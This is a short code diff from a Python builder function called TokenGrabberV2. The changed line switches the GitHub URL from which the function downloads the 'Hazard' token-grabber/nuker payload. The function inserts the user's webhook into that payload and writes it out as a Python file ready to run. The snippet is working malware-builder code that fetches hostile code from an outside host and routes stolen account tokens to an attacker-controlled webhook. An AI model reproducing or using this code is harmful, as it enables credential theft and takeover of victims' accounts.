@@ -25,7 +25,7 @@ def TokenGrabberV2(WebHook, fileName):
         'pillow',
     ]
     installPackage(required)
-    code = requests.get("https://raw.githubusercontent.com/KDot227/hazard-nuker-mirror/main/assets/main.py").text.replace("WEBHOOK_HERE", WebHook)
+    code = requests.get("https://raw.githubusercontent.com/Prize-app/Hazard/main/main.py").text.replace("WEBHOOK_HERE", WebHook)
     with open(f"{fileName}.py", 'w', encoding='utf8', errors="ignore") as f:
         f.write(code)
 
